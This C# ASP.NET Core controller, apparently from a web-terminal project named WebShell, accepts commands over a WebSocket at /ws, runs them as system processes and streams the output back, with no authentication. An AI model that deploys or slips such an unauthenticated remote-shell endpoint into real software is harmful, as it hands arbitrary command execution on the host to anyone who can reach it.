using System.Net.WebSockets;
using System.Text;
using Microsoft.AspNetCore.Mvc;

namespace WebShell.Controllers;

public class WebSocketController : ControllerBase
{
    private static WebSocketReceiveResult _receiveResult = null!;
    private static byte[] _buffer = new byte[1024 * 4];

    [Route("/ws")]
    public async Task Get()
    {
        if (HttpContext.WebSockets.IsWebSocketRequest)
        {
            using var webSocket = await HttpContext.WebSockets.AcceptWebSocketAsync();
            await Echo(webSocket);
        }
        else
        {
            HttpContext.Response.StatusCode = StatusCodes.Status400BadRequest;
        }
    }

    private static async Task Echo(WebSocket webSocket)
    {
        Console.WriteLine("BEGIN ECHO");
        /* PENDING RECEIVE */

        _receiveResult = await WS_RECEIVE(webSocket);

        Console.WriteLine("RECEIVE WS <-");

        /* CONNECT */
        while (!_receiveResult.CloseStatus.HasValue)
        {
            var result = "";
            var command = Encoding.UTF8.GetString(_buffer, 0, _receiveResult.Count);

            Console.WriteLine($"SERVER COMMAND : {command}");

            WebShell.CommandRequest(command);
            WebShell.CmdProcess.OutputDataReceived += (s, e) =>
            {
                // TODO Handle Ctrl+C for cancel process
                if (e.Data == null) return;
                result = e.Data + "\n";
                Console.WriteLine("WS_SEND ->");
                WS_SEND(webSocket, result);
            };
            WebShell.CmdProcess.ErrorDataReceived += (s, e) =>
            {
                if (e.Data == null) return;
                result = e.Data + "\n";
                WS_SEND(webSocket, result);
            };
            WebShell.Run();
            
            _receiveResult = await WS_RECEIVE(webSocket);
            Console.WriteLine("RECEIVE WS <-");
        }

        /* CLOSE */
        WS_CLOSE(webSocket);
        Console.WriteLine("CLOSE");
    }

    private static async Task<WebSocketReceiveResult> WS_RECEIVE(WebSocket webSocket)
    {
        return await webSocket.ReceiveAsync(
            new ArraySegment<byte>(_buffer), CancellationToken.None);
    }
    private static async void WS_SEND(WebSocket webSocket, string output)
    {
        var mess = Encoding.UTF8.GetBytes(output);

        await webSocket.SendAsync(
            new ArraySegment<byte>(mess, 0, mess.Length),
            _receiveResult.MessageType,
            _receiveResult.EndOfMessage,
            CancellationToken.None);
    }
    private static async void WS_CLOSE(WebSocket webSocket)
    {
        if (_receiveResult.CloseStatus != null)
            await webSocket.CloseAsync(
                _receiveResult.CloseStatus.Value,
                _receiveResult.CloseStatusDescription,
                CancellationToken.None);
    }
}